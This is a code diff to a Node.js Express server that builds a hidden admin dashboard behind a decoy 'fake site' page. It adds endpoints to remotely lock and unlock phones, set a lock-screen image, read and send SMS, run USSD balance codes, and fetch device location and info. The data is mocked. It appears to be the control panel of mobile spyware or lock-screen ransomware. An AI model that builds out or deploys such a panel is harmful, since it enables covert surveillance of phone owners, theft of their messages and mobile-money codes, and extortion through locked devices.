@@ -1,6 +1,7 @@
-// server.js – SIMPLIFIED TEST VERSION
+// server.js – Serves admin.html from public folder
 const express = require('express');
 const crypto = require('crypto');
+const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
@@ -23,7 +24,7 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 // ============================================================
-// FAKE SITE (simple)
+// FAKE SITE
 // ============================================================
 app.get('/', (req, res) => {
     res.send(`
@@ -41,23 +42,14 @@ app.get('/', (req, res) => {
 });
 
 // ============================================================
-// ADMIN DASHBOARD – SIMPLE TEST
+// ADMIN DASHBOARD – serves from public/admin.html
 // ============================================================
 app.get('/a9f3k217', (req, res) => {
-    res.send(`
-        <html>
-        <head><title>Admin Dashboard</title></head>
-        <body style="background:#0a0e17;color:#e0e6ed;font-family:sans-serif;padding:20px;">
-            <h1 style="color:#4fc3f7;">📊 Admin Dashboard</h1>
-            <p>If you see this, the server is working!</p>
-            <p style="color:#8896ab;">ADMIN GRY</p>
-        </body>
-        </html>
-    `);
+    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
 });
 
 // ============================================================
-// LOGIN API (simple)
+// LOGIN API
 // ============================================================
 app.post('/a9f3k217/api/login', (req, res) => {
     const ip = getClientIP(req);
@@ -98,16 +90,152 @@ app.post('/a9f3k217/api/login', (req, res) => {
 });
 
 // ============================================================
-// SIMPLE STATS
+// DEVICE STATE (in-memory)
 // ============================================================
-app.get('/a9f3k217/api/stats', (req, res) => {
-    res.json({ devices: 0, numbers: 0, online: 0 });
+let devices = {
+    'device1': { name: 'Samsung S23', locked: false, battery: 85, online: true },
+    'device2': { name: 'iPhone 15', locked: false, battery: 92, online: true },
+    'device3': { name: 'Pixel 8', locked: true, battery: 67, online: false }
+};
+let lockScreenImage = null;
+
+app.get('/a9f3k217/api/devices-lock', (req, res) => {
+    res.json(devices);
+});
+
+app.post('/a9f3k217/api/lock-device', (req, res) => {
+    const { deviceId, action } = req.body;
+    if (!deviceId || !devices[deviceId]) {
+        return res.status(404).json({ error: 'Device not found' });
+    }
+    if (action === 'lock') {
+        devices[deviceId].locked = true;
+        res.json({ success: true, message: 'Device locked' });
+    } else if (action === 'unlock') {
+        devices[deviceId].locked = false;
+        res.json({ success: true, message: 'Device unlocked' });
+    } else {
+        res.status(400).json({ error: 'Invalid action' });
+    }
+});
+
+app.post('/a9f3k217/api/lock-all', (req, res) => {
+    Object.keys(devices).forEach(id => { devices[id].locked = true; });
+    res.json({ success: true, message: 'All devices locked' });
+});
+
+app.post('/a9f3k217/api/unlock-all', (req, res) => {
+    Object.keys(devices).forEach(id => { devices[id].locked = false; });
+    res.json({ success: true, message: 'All devices unlocked' });
+});
+
+app.post('/a9f3k217/api/upload-lock-image', (req, res) => {
+    const { image } = req.body;
+    if (!image) {
+        return res.status(400).json({ error: 'No image provided' });
+    }
+    lockScreenImage = image;
+    res.json({ success: true, message: 'Lock screen image uploaded' });
 });
 
 // ============================================================
-// START SERVER
+// SMS
 // ============================================================
+let smsMessages = [
+    { number: '12345', body: 'Your account balance is 1,500 RWF', timestamp: Date.now() - 3600000 },
+    { number: '1234', body: 'Data bundle: 2GB remaining', timestamp: Date.now() - 7200000 },
+    { number: '98765', body: 'Your PIN has been changed successfully', timestamp: Date.now() - 86400000 }
+];
+
+app.get('/a9f3k217/api/sms', (req, res) => {
+    res.json(smsMessages);
+});
+
+app.post('/a9f3k217/api/send-sms', (req, res) => {
+    const { number, message } = req.body;
+    if (!number || !message) {
+        return res.status(400).json({ error: 'Number and message required' });
+    }
+    smsMessages.unshift({ number, body: message, timestamp: Date.now() });
+    if (smsMessages.length > 100) smsMessages.pop();
+    res.json({ success: true, message: 'SMS sent' });
+});
+
+// ============================================================
+// USSD
+// ============================================================
+let ussdNumbers = [];
+
+app.post('/a9f3k217/api/ussd', (req, res) => {
+    const { code } = req.body;
+    if (!code) return res.status(400).json({ error: 'No USSD code provided' });
+
+    let responseMessage = '';
+    if (code.includes('123')) responseMessage = 'Your account balance is 1,500 RWF. Validity: 7 days. Thank you.';
+    else if (code.includes('131')) responseMessage = 'Data bundle: 2GB remaining. Expires on 2026-08-15.';
+    else if (code.includes('144')) responseMessage = 'Airtime balance: 500 RWF. Bonus: 100 RWF.';
+    else if (code.includes('200')) responseMessage = 'Welcome to Kigali Tech Services. Please select an option:\n1. Account Info\n2. Data Plans\n3. Support';
+    else responseMessage = `USSD code ${code} executed. No further response available.`;
+
+    const cleanNumber = code.replace(/\D/g, '');
+    if (cleanNumber.length >= 4 && cleanNumber.length <= 5) {
+        ussdNumbers.unshift({
+            device: 'Sample Device',
+            number: cleanNumber,
+            type: 'USSD',
+            timestamp: Date.now()
+        });
+        if (ussdNumbers.length > 100) ussdNumbers.pop();
+    }
+
+    res.json({ success: true, message: responseMessage });
+});
+
+app.get('/a9f3k217/api/ussd-numbers', (req, res) => res.json(ussdNumbers));
+app.get('/a9f3k217/api/stats', (req, res) => {
+    res.json({
+        devices: 0,
+        numbers: ussdNumbers.length,
+        online: 0,
+        ussd_count: ussdNumbers.length
+    });
+});
+app.get('/a9f3k217/api/location', (req, res) => {
+    res.json({
+        lat: -1.9441,
+        lng: 30.0619,
+        accuracy: 15,
+        time: new Date().toLocaleString()
+    });
+});
+app.get('/a9f3k217/api/device-info', (req, res) => {
+    res.json({
+        model: 'Samsung Galaxy S23',
+        manufacturer: 'Samsung',
+        android_version: '14.0',
+        battery: 76,
+        storage: '128GB / 89GB used',
+        device_id: 'abc123def456'
+    });
+});
+app.get('/a9f3k217/api/devices', (req, res) => res.json([]));
+
+// ============================================================
+// 404
+// ============================================================
+app.use((req, res) => {
+    res.status(404).send(`
+        <html>
+        <head><title>404</title></head>
+        <body style="background:#0a0e17;color:#8896ab;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center;">
+            <h1 style="color:#4fc3f7;">404</h1>
+            <p>Not found</p>
+        </body>
+        </html>
+    `);
+});
+
 app.listen(PORT, () => {
-    console.log(`✅ Server running on port ${PORT}`);
+    console.log(`✅ Dashboard running on port ${PORT}`);
     console.log(`📍 https://admin-dashboard-teal-beta-28.vercel.app/a9f3k217`);
 });
